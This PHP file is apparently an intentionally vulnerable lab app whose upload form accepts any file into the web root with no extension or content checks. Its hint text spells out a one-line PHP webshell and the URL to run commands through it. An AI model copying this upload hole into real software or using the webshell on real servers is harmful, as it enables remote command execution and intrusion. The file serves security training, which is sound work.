<?php
// ============================================================
// EDUCATIONAL VULNERABLE APP — intentionally insecure upload
// Demonstrates: unrestricted file upload (webshell upload vector)
// ============================================================

$message = '';
$uploaded_path = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['userfile'])) {
    $file = $_FILES['userfile'];

    if ($file['error'] === UPLOAD_ERR_OK) {
        $filename = basename($file['name']); // No extension check — intentional
        $dest     = '/var/www/html/uploads/' . $filename;

        // No MIME-type validation, no extension whitelist — intentional vulnerability
        if (move_uploaded_file($file['tmp_name'], $dest)) {
            $uploaded_path = '/uploads/' . $filename;
            $message = 'Upload successful: <a href="' . htmlspecialchars($uploaded_path, ENT_QUOTES) . '">'
                     . htmlspecialchars($uploaded_path, ENT_QUOTES) . '</a>';
        } else {
            $message = 'Failed to move uploaded file. Check /var/www/html/uploads permissions.';
        }
    } else {
        $codes = [
            UPLOAD_ERR_INI_SIZE   => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE  => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL    => 'Partial upload',
            UPLOAD_ERR_NO_FILE    => 'No file uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'No tmp directory',
            UPLOAD_ERR_CANT_WRITE => 'Cannot write to disk',
        ];
        $message = 'Upload error: ' . ($codes[$file['error']] ?? 'Unknown error ' . $file['error']);
    }
}

// List existing uploads
$uploads = glob('/var/www/html/uploads/*') ?: [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Upload — CorpApp</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; margin: 40px; }
        h1 { color: #00d4ff; }
        .hint { color: #888; font-size: 0.85em; }
        .success { color: #4caf50; }
        .error   { color: #ff6b6b; }
        .uploads { background: #0d2137; border-left: 3px solid #00d4ff;
                   padding: 10px; margin-top: 15px; }
        input[type=submit] { background: #ff6b6b; color: #fff; border: none;
                              padding: 6px 14px; cursor: pointer; margin-top: 8px; }
    </style>
</head>
<body>
<h1>File Upload</h1>

<p class="hint">
    Upload any file — no extension or content validation is performed.<br>
    Hint: upload a PHP webshell (e.g. <code>&lt;?php system($_GET['cmd']); ?&gt;</code> saved as <code>shell.php</code>),
    then access <code>/uploads/shell.php?cmd=id</code>
</p>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="userfile"><br>
    <input type="submit" value="Upload">
</form>

<?php if ($message): ?>
    <p class="<?php echo $uploaded_path ? 'success' : 'error'; ?>">
        <?php echo $message; // XSS-safe via htmlspecialchars above ?>
    </p>
<?php endif; ?>

<?php if ($uploads): ?>
<div class="uploads">
    <strong>Existing uploads:</strong><br>
    <?php foreach ($uploads as $f): ?>
        <a href="/uploads/<?php echo htmlspecialchars(basename($f), ENT_QUOTES); ?>"
           style="color:#00d4ff">
            /uploads/<?php echo htmlspecialchars(basename($f), ENT_QUOTES); ?>
        </a><br>
    <?php endforeach; ?>
</div>
<?php endif; ?>

<p><a href="/" style="color:#00d4ff">← Back to main page</a></p>
</body>
</html>
